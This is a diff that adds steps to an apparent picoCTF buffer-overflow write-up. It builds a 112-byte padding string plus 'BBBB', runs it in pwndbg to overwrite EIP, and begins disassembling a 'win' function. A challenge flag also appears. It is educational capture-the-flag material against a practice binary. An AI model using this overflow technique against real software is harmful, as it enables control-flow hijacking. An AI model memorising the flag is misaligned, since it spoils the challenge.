@@ -247,3 +247,25 @@ picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
 
 <https://play.picoctf.org/practice/challenge/259>
 
+```python
+>>> 'a'*112 + 'BBBB'
+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB'
+```
+
+```
+pwndbg> run
+...
+Please enter your string: 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+...
+*EIP  0x42424242 ('BBBB')
+```
+
+```
+pwndbg> disassemble win
+Dump of assembler code for function win:
+   0x08049296 <+0>:     endbr32
+```
